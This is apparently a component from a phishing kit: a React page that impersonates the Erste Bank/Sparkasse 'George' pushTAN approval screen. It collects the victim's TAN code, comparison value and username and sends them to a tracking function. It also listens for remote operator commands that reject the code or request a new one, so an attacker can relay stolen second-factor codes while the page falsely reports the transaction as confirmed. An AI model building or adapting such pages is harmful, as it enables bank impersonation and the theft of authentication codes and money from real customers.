"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { trackSubmission, onCommand } from "@/lib/track";

/* ---- random 4-char reference code ---- */
function generateVergleichswert(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let result = "";
  for (let i = 0; i < 4; i++) {
    result += chars[Math.floor(Math.random() * chars.length)];
  }
  return result;
}

const TOTAL_SECONDS = 300; // 5 minutes

export default function PushTanForm({ user, vergleichswert: vergleichswertProp }: { user: string; vergleichswert?: string }) {
  const [vergleichswert] = useState(() => vergleichswertProp || generateVergleichswert());
  const [code, setCode] = useState("");
  const [secondsLeft, setSecondsLeft] = useState(TOTAL_SECONDS);
  const [expired, setExpired] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null);

  /* ---- countdown timer ---- */
  useEffect(() => {
    timerRef.current = setInterval(() => {
      setSecondsLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current!);
          setExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
    };
  }, []);

  /* ---- command handler ---- */
  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError((cmd.payload?.message as string) || "Ein Fehler ist aufgetreten.");
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError("TAN-Code ist falsch. Bitte versuchen Sie es erneut.");
          setCode("");
          break;
        case "retry_tan":
          setError("Bitte geben Sie einen neuen Code ein.");
          setCode("");
          setExpired(false);
          setSecondsLeft(TOTAL_SECONDS);
          if (timerRef.current) clearInterval(timerRef.current);
          timerRef.current = setInterval(() => {
            setSecondsLeft((prev) => {
              if (prev <= 1) {
                clearInterval(timerRef.current!);
                setExpired(true);
                return 0;
              }
              return prev - 1;
            });
          }, 1000);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const formatTime = useCallback((s: number) => {
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  }, []);

  const progressFraction = secondsLeft / TOTAL_SECONDS;

  const isValid = code.length >= 4 && code.length <= 6 && !expired;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isValid || submitting) return;
    setSubmitting(true);
    setError(null);
    await trackSubmission("sparkasse", "pushtan", { code, vergleichswert, user });
    setSuccess(true);
    setSubmitting(false);
  };

  /* ---- SVG ring constants ---- */
  const ringSize = 88;
  const strokeWidth = 4;
  const radius = (ringSize - strokeWidth) / 2;
  const circumference = 2 * Math.PI * radius;
  const dashOffset = circumference * (1 - progressFraction);

  return (
    <>
      <main>
        {/* LEFT SIDE -- Form */}
        <div className="left-side">
          <div
            className="d-flex justify-content-end px-3 pt-3"
            style={{ display: "flex", justifyContent: "flex-end", padding: "1rem 1rem 0" }}
          >
            <div className="language">
              <a className="lang_en" title="English" />
              <a className="lang_de" title="Deutsch" />
            </div>
          </div>

          <div style={{ flex: 1, display: "flex", alignItems: "center" }}>
            <div className="wrapper">
              <div className="text-center">
                <img
                  className="product-icon"
                  src="/sparkasse/george-logo-bright-blue.svg"
                  alt="George Logo"
                />
              </div>

              <h1 className="text-center" style={{ margin: "1rem 0 0.25rem", fontSize: "1.5rem" }}>
                pushTAN Freigabe
              </h1>

              <div className="mb-2 description" style={{ marginBottom: "0.75rem" }}>
                Best&auml;tigen Sie die Transaktion in Ihrer pushTAN-App
                und geben Sie den TAN-Code ein.
              </div>

              {/* Error banner */}
              {error && (
                <div
                  style={{
                    backgroundColor: "#fdeaea",
                    color: "#b91c1c",
                    border: "1px solid #f5c6cb",
                    borderRadius: "0.75rem",
                    padding: "10px 14px",
                    marginBottom: "12px",
                    fontSize: "0.875rem",
                  }}
                >
                  {error}
                </div>
              )}

              {success ? (
                /* ---- Success state ---- */
                <div style={{ textAlign: "center", padding: "28px 0 36px" }}>
                  <div
                    style={{
                      width: 60,
                      height: 60,
                      borderRadius: "50%",
                      background: "linear-gradient(135deg, #028661, #0cb43f)",
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      margin: "0 auto 18px",
                      boxShadow: "0 4px 16px rgba(2, 134, 97, 0.25)",
                    }}
                  >
                    <svg
                      width="30"
                      height="30"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="#fff"
                      strokeWidth="2.5"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                  </div>
                  <p
                    style={{
                      fontSize: "1.1rem",
                      color: "var(--bs-body-color)",
                      marginBottom: 6,
                      fontWeight: 600,
                    }}
                  >
                    Transaktion best&auml;tigt
                  </p>
                  <p style={{ fontSize: "0.85rem", color: "var(--bs-secondary-color)" }}>
                    Ihre Eingabe wurde erfolgreich &uuml;bermittelt.
                  </p>
                </div>
              ) : (
                <form onSubmit={handleSubmit}>
                  {/* Timer ring + Vergleichswert */}
                  <div
                    style={{
                      display: "flex",
                      alignItems: "center",
                      gap: 24,
                      justifyContent: "center",
                      padding: "16px 0 12px",
                    }}
                  >
                    {/* Countdown ring */}
                    <div
                      style={{
                        position: "relative",
                        width: ringSize,
                        height: ringSize,
                        flexShrink: 0,
                      }}
                    >
                      <svg
                        width={ringSize}
                        height={ringSize}
                        style={{ transform: "rotate(-90deg)" }}
                      >
                        <circle
                          cx={ringSize / 2}
                          cy={ringSize / 2}
                          r={radius}
                          fill="none"
                          stroke="#e8edf2"
                          strokeWidth={strokeWidth}
                        />
                        <circle
                          cx={ringSize / 2}
                          cy={ringSize / 2}
                          r={radius}
                          fill="none"
                          stroke={expired ? "#eb4c79" : "var(--sts-color-bright-blue)"}
                          strokeWidth={strokeWidth}
                          strokeDasharray={circumference}
                          strokeDashoffset={dashOffset}
                          strokeLinecap="round"
                          style={{ transition: "stroke-dashoffset 1s linear" }}
                        />
                      </svg>
                      <div
                        style={{
                          position: "absolute",
                          top: 0,
                          left: 0,
                          width: "100%",
                          height: "100%",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          fontSize: 17,
                          fontWeight: 600,
                          color: expired ? "#eb4c79" : "var(--bs-body-color)",
                          fontVariantNumeric: "tabular-nums",
                        }}
                      >
                        {formatTime(secondsLeft)}
                      </div>
                    </div>

                    {/* Vergleichswert */}
                    <div>
                      <p
                        style={{
                          fontSize: "0.7rem",
                          color: "var(--bs-secondary-color)",
                          marginBottom: 6,
                          textTransform: "uppercase",
                          letterSpacing: "0.08em",
                          fontWeight: 500,
                        }}
                      >
                        Vergleichswert
                      </p>
                      <p
                        style={{
                          fontSize: "2rem",
                          fontWeight: 600,
                          color: "var(--sts-color-bright-blue)",
                          letterSpacing: "0.18em",
                          lineHeight: 1,
                          margin: 0,
                        }}
                      >
                        {vergleichswert}
                      </p>
                    </div>
                  </div>

                  {/* Divider */}
                  <div
                    style={{
                      borderTop: "1px solid #e8edf2",
                      margin: "8px 0 20px",
                    }}
                  />

                  {/* TAN-Code input */}
                  <div className="mb-3 position-relative">
                    <svg
                      className="input-icon"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                    </svg>
                    <input
                      type="text"
                      id="tan-code"
                      className="form-control"
                      placeholder="TAN-Code eingeben"
                      value={code}
                      onChange={(e) =>
                        setCode(
                          e.target.value.replace(/[^A-Za-z0-9]/g, "").slice(0, 6)
                        )
                      }
                      maxLength={6}
                      disabled={expired}
                      autoComplete="one-time-code"
                      inputMode="text"
                      spellCheck={false}
                      style={{
                        opacity: expired ? 0.5 : 1,
                        letterSpacing: "0.15em",
                        fontSize: "1.05rem",
                      }}
                      suppressHydrationWarning
                    />
                  </div>

                  {expired && (
                    <p
                      style={{
                        textAlign: "center",
                        color: "#eb4c79",
                        fontSize: "0.85rem",
                        margin: "-4px 0 12px",
                      }}
                    >
                      Zeit abgelaufen. Bitte fordern Sie einen neuen Code an.
                    </p>
                  )}

                  {/* Submit button */}
                  <div className="mb-3 d-grid gap-2">
                    <button
                      type="submit"
                      className="btn btn-primary"
                      disabled={!isValid || submitting}
                      style={{
                        opacity: !isValid || submitting ? 0.5 : 1,
                        cursor: !isValid || submitting ? "not-allowed" : "pointer",
                        fontWeight: 500,
                        padding: "0.5rem 0.75rem",
                      }}
                    >
                      {submitting ? "Wird geprüft…" : "Bestätigen"}
                    </button>
                  </div>

                  {/* Security note */}
                  <div
                    style={{
                      display: "flex",
                      alignItems: "flex-start",
                      gap: 8,
                      padding: "8px 0 0",
                    }}
                  >
                    <svg
                      width="16"
                      height="16"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="var(--bs-secondary-color)"
                      strokeWidth="2"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      style={{ flexShrink: 0, marginTop: 1 }}
                    >
                      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                    </svg>
                    <p
                      style={{
                        fontSize: "0.75rem",
                        color: "var(--bs-secondary-color)",
                        margin: 0,
                        lineHeight: 1.4,
                      }}
                    >
                      Geben Sie den TAN-Code niemals per Telefon oder E-Mail weiter.
                      George wird Sie niemals danach fragen.
                    </p>
                  </div>
                </form>
              )}
            </div>
          </div>

          <div style={{ height: "1rem" }} />
        </div>

        {/* RIGHT SIDE -- Green with George logo */}
        <div className="right-side">
          <img
            className="absolute-centered fade-in-1s"
            src="/sparkasse/george-logo-white.svg"
            alt="George"
          />

          <div className="tagline">
            <div className="fade-in-1s delay-1s">Sicher</div>
            <div className="fade-in-1s delay_14">Einfach</div>
            <div className="fade-in-1s delay_18">Digital</div>
          </div>
        </div>
      </main>

      {/* FOOTER */}
      <footer>
        <img
          className="footer-logo"
          src="/sparkasse/eb-spk-logo-white.svg"
          alt="Erste Bank und Sparkassen"
        />
        <ul
          className="nav"
          style={{
            display: "flex",
            alignItems: "center",
            listStyle: "none",
            margin: 0,
            padding: 0,
          }}
        >
          <li className="nav-item">
            <a className="nav-link" href="#">Imprint</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Privacy</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Terms &amp; Conditions</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">Contact &amp; Services</a>
          </li>
          <li className="nav-item">
            <a className="nav-link" href="#">George Help Center</a>
          </li>
        </ul>
      </footer>
    </>
  );
}
